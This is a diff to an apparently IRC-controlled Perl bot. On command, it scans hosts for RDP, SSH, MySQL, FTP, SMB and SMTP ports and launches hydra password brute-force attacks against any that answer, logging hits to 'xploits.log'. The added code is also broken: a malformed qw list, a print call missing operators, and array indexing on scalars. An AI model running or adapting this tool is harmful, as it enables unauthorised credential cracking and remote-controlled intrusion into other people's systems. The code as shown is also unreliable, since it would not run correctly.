@@ -7,11 +7,19 @@ use Fcntl qw(:flock SEEK_END);
 my $filename = 'CCFinder.log';
 $|=1;
 #defineportshere
+my @hydra_PORTS = qw/'3389 22 3306 21 445 139 25/';
 use Mojo::IOLoop;
 #definetimeouthere
 #defineforkshere
-#definenoticechanhere
 #definechanhere
+#definenoticechanhere
+
+my $irc = Mojo::IRC->new(
+#definenickhere
+ user => 'VNCScan',
+#defineserverhere
+ );
+#definesslhere
 $irc->on(irc_rpl_welcome => sub {
  my($irc, $err) = @_;
  warn 'Joined IRC server.';
@@ -121,9 +129,9 @@ $irc->on(irc_privmsg => sub {
     my $arg = shift;
     foreach my $porti (@hydra_PORTS)
     {
-      if (my $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $porti->[0], Proto => 'tcp')) {
-        printa("[Cracking " . $porti->[1] . "] $host");
-        my @cmdhydra = ("sudo hydra -F -L /user -P /pass $host " . lc($porti->[1]) . " -s " . $porti->[0] . " -v -t 4 -W3 >>xploits.log");     
+      if (my $sock = IO::Socket::INET->new(PeerAddr => $row, PeerPort => $porti->[0], Proto => 'tcp')) {
+        printa("Cracking " $porti $row);
+        my @cmdhydra = ("sudo hydra -F -L /user -P /pass $row " . lc($porti->[1]) . " -s " . $porti->[0] . " -v -t 4 -W3 >>xploits.log");     
         close($sock);
         system(@cmdhydra);
         return;
